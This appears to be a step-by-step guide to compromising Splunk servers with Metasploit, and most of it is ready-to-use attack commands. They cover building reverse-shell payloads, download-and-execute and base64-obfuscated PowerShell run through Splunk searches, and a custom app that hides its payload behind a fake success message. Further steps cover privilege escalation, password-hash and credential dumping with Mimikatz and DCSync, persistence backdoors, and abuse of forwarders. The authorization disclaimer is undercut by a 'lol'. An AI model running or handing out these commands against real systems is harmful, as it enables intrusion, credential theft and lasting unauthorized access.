# Metasploit Framework Integration with Splunk: Educational Guide

This guide details how to use Metasploit Framework (MSF) with Splunk for security testing purposes. 
This information is provided for educational purposes and should only be used in environments where you have explicit authorization, lol.



## Generating MSF Payloads for Splunk

### Prerequisites
- Metasploit Framework installed
- Proper authorization to test the target
- Splunk admin access or sufficient search execution permissions

## Step 1: Generate MSF Payloads

### For Windows Targets

```bash
# Generate a PowerShell-based reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f psh -o splunk_win_payload.ps1

# Generate a raw format payload encoded in base64 (useful for direct command execution)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw | base64 -w 0 > splunk_win_payload_b64.txt
```

### For Linux Targets

```bash
# Generate a Python-based payload for Linux
msfvenom -p python/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o splunk_linux_payload.py

# Generate a bash-based payload
msfvenom -p cmd/unix/reverse_bash LHOST=YOUR_IP LPORT=4444 -o splunk_linux_payload.sh
```

## Step 2: Set Up the MSF Handler

Start MSFconsole and configure the handler:

```bash
msfconsole
```

Inside MSFconsole:

```
# For Windows targets
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
set ExitOnSession false
exploit -j -z

# For Linux targets
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp  # or cmd/unix/reverse_bash
set LHOST YOUR_IP
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

## Step 3: Deploy the Payload to Splunk

### Method 1: Using Splunk's Script Command (Windows)

```
| script powershell
IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/splunk_win_payload.ps1')
```

Alternative obfuscated approach:
```
| script powershell
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('BASE64_FROM_SPLUNK_WIN_PAYLOAD_B64'))
Invoke-Expression $payload
```

### Method 2: Using a Custom Splunk App

Create a custom app with a Python script that loads the Meterpreter payload:

1. Create the app structure:
```
msf_tool/
├── bin/
│   └── msf_trigger.py
├── default/
│   └── commands.conf
├── metadata/
│   └── default.meta
```

2. In `msf_trigger.py` (for Windows):
```python
import splunk.Intersplunk
import subprocess
import os
import base64
import sys

def main():
    try:
        # Base64-encoded Meterpreter payload
        payload = "BASE64_FROM_SPLUNK_WIN_PAYLOAD_B64"
        
        # Decode the payload
        decoded = base64.b64decode(payload)
        
        # Execute with PowerShell
        powershell_cmd = f'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "{decoded}"'
        subprocess.Popen(powershell_cmd, shell=True)
        
        # Return dummy results
        results = []
        results.append({"message": "Command executed successfully"})
        splunk.Intersplunk.outputResults(results)
        
    except Exception as e:
        results = []
        results.append({"error": str(e)})
        splunk.Intersplunk.outputResults(results)

if __name__ == "__main__":
    main()
```

3. In `commands.conf`:
```
[msf_trigger]
filename = msf_trigger.py
chunked = false
enableheader = false
```

4. Deploy to Splunk and trigger with:
```
| msf_trigger
```

## Step 4: Post-Exploitation and Privilege Escalation

Once you have a Meterpreter session, you can proceed with privilege escalation and hash extraction.

### Privilege Escalation to SYSTEM (Windows)

1. Within your active Meterpreter session:
```
# Check current privileges
getuid

# If not SYSTEM already, attempt to elevate
getsystem

# If getsystem fails, try these alternatives
run post/windows/escalate/bypassuac  # if UAC is enabled
use exploit/windows/local/always_install_elevated  # if AlwaysInstallElevated is enabled
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc  # common Windows privilege escalation
```

2. For newer Windows systems, you might need to migrate to a more stable process:
```
# List processes
ps

# Migrate to a SYSTEM process (like winlogon.exe or services.exe)
migrate PID_NUMBER
```

### Extracting Password Hashes (Windows)

1. Once you have SYSTEM privileges:
```
# Dump local SAM hashes
hashdump

# For a more comprehensive approach
run post/windows/gather/smart_hashdump

# Load Kiwi (Mimikatz) for advanced credential harvesting
load kiwi
creds_all
```

2. For domain controllers or to access cached domain credentials:
```
# Run Mimikatz for domain hashes
load kiwi
lsa_dump_sam
lsa_dump_secrets
dcsync_ntlm domain\\administrator
```

### Linux Privilege Escalation and Hash Extraction

1. For Linux targets after getting a Meterpreter shell:
```
# Check current user
getuid

# Attempt privilege escalation
sudo -l  # Check sudo permissions
use exploit/linux/local/cve_2021_4034_pwnkit_lpe  # For newer Linux systems
use exploit/linux/local/cve_2019_13272_linux  # Kernel exploit for older systems
```

2. Extract password hashes:
```
# Grab /etc/shadow
cat /etc/shadow

# Use built-in modules
run post/linux/gather/hashdump

# Search for interesting files
run post/multi/gather/interesting_files
```

## Step 5: Maintaining Access (Optional)

If authorized as part of your assessment, you can establish persistence:

### Windows Persistence
```
# Run the persistence module
run persistence -h  # View options
run persistence -X -i 60 -p 443 -r YOUR_IP
```

### Linux Persistence
```
# Create a persistent backdoor
run persistence -h
run persistence -L -i 60 -p 443 -r YOUR_IP
```

## Advanced Splunk-Specific Techniques

### Using Scheduled Searches

Create a scheduled search that runs your payload regularly:

1. Navigate to Settings → Searches, reports, and alerts
2. Create a new scheduled search
3. Set the search to:
```
| script python
import os
os.system("powershell -e BASE64_ENCODED_PAYLOAD")
```
4. Schedule it to run at your desired interval

### Leveraging Forwarders

If the target has Splunk Universal Forwarders deployed:

1. Modify `inputs.conf` on a compromised system:
```
[script://./bin/meterpreter.bat]
disabled = 0
interval = 300
```

2. Create `meterpreter.bat` in the `bin` directory with your payload

## Cleanup

After authorized testing is complete, be sure to:

1. Remove any custom apps and scripts
2. Delete scheduled searches
3. Terminate any persistent backdoors
4. Document all actions taken for the client

## Security Considerations

Remember these key points:

1. **Authorization**: Only perform these activities with explicit written permission
2. **Documentation**: Document all actions for your assessment report
3. **Containment**: Be careful not to affect production operations
4. **Legal**: Ensure your activities comply with applicable laws and regulations


##
##
##
